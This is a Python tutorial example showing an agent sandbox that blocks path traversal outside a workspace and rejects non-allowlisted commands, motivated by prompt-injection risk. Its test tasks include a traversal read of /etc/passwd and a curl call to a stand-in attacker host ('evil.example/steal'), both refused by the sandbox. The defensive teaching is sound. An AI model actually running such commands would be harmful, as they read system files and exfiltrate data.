"""
Example 05 — the sandbox: the boundary tools execute inside.
============================================================

The model chose the arguments, and the model is acting on text that might be
attacker-controlled (the Prompt Injection dive's whole warning). So tool execution
needs a boundary the model can't talk its way past. The harness owns it; your bare
loop didn't.

Two boundaries here, both reject-by-default:

  path jail        — every file path is resolved and must stay under the workspace
                     root. `../../etc/passwd` resolves outside → refused.
  command allowlist — only named executables run. `echo` is allowed; `curl` isn't.

We let the agent read a legit file, then try a directory-traversal escape, then try
an allowlisted command and a non-allowlisted one.

Run it:

    python examples/05_sandbox.py
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from dotenv import load_dotenv

from harness import Harness, Sandbox, describe, ensure_ready
from harness.tools import READ_FILE, RUN_COMMAND

load_dotenv()
ensure_ready()
print(f"Provider: {describe()}\n")

# A sandbox rooted at ./workspace, with only `echo` on the command allowlist.
sandbox = Sandbox("workspace", allowed_commands={"echo"})
sandbox.write("welcome.txt", "This file lives safely inside the sandbox.")

agent = Harness(
    "You are an assistant with file and shell tools.",
    [READ_FILE, RUN_COMMAND],
    sandbox=sandbox,
)

for task in [
    "read welcome.txt",  # inside the jail -> ok
    "read ../../../../etc/passwd",  # escape attempt -> refused
    "run echo hello from the sandbox",  # allowlisted -> runs
    "run curl http://evil.example/steal",  # not allowlisted -> refused
]:
    print(f"Task: {task}")
    for event in agent.run(task):
        print("  " + event.line())
    print()

print(
    "The legit read and the allowlisted `echo` ran; the path-traversal escape and the\n"
    "non-allowlisted `curl` were refused at the boundary — as tool RESULTS, so the\n"
    "agent sees the refusal and adapts rather than crashing. Note the jail checks the\n"
    "*resolved* path, not the raw string, so `..` and symlink tricks can't sneak out.\n"
    "Real harnesses sandbox far harder (containers, seccomp, egress rules, a hosted\n"
    "per-session workspace) — but it's this same contract: the model proposes, the\n"
    "sandbox disposes."
)
